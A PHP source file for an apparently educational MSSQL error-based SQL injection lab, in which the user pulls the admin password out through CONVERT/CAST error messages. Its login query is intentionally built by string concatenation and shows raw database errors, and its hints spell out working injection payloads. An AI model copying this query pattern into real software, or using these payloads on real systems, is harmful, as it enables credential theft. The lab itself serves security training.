<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 password FROM users WHERE username='admin'");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['password']) {
                $_SESSION['mssql_lab2_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab2", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 2. Error-Based: CONVERT / CAST</h3>

    <h4>Scenario</h4>
    <p>
        A login page checks user credentials against the database.
        The page only tells you <strong>"Login successful"</strong> or
        <strong>"Invalid credentials"</strong>: no query data is ever
        displayed on screen. However, the application <em>does</em> display raw MSSQL
        error messages when a query fails.
    </p>

    <h4>Objective</h4>
    <p>
        Use <strong>CONVERT()</strong> or <strong>CAST()</strong> to force MSSQL
        into leaking the <strong>admin password</strong> through a type conversion error message.
        Submit the password below to prove you solved the lab.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try a single quote <code>'</code> in the username field: does it cause an error?<br>
        2. <code>CONVERT(INT, 'string')</code> fails and reveals the string in the error.<br>
        3. Try: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -</code><br>
        4. Alternative: <code>' AND 1=CAST((SELECT TOP 1 password FROM users WHERE username='admin') AS INT) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab2_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the admin password using MSSQL CONVERT/CAST error-based injection.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Login</h4>
    <form method="POST" class="form-row">
<input type="text" name="username" class="input" placeholder="Username" value="<?= htmlspecialchars($_POST['username'] ?? '') ?>">
        <input type="text" name="password" class="input" placeholder="Password" value="<?= htmlspecialchars($_POST['password'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Login</button>
    </form>
</div>

<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute: error-based: only show success/failure, NOT actual row data
    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!empty($rows)) {
                echo '<div class="result-success result-box"><strong>Login successful</strong>: Welcome back!</div>';
            } else {
                echo '<div class="result-warning result-box">Invalid credentials. No matching user found.</div>';
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-error result-box">';
        echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
        echo '</div>';
    }
}
?>

<?php endif; ?>
